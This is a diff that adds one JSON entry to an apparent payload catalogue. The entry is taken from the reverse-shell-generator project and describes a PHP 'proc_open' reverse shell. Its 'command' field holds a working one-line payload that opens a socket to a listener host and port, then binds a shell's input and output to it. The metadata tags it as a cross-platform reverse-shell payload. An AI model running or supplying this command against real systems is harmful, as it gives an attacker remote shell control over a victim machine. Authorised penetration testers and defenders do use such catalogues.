@@ -1,0 +1,30 @@
+{
+  "id": "rsg-reverseshell-php-proc-open",
+  "name": "RSG · ReverseShell · PHP proc_open",
+  "command": "php -r '$s=fsockopen(\"<lhost>\",<lport>);proc_open(\"<shell>\",[$s,$s,$s],$p);'",
+  "description": "Reverse Shell payload — PHP proc_open (via reverse-shell-generator).",
+  "platform": "cross-platform",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "windows",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/PHP proc_open/35",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
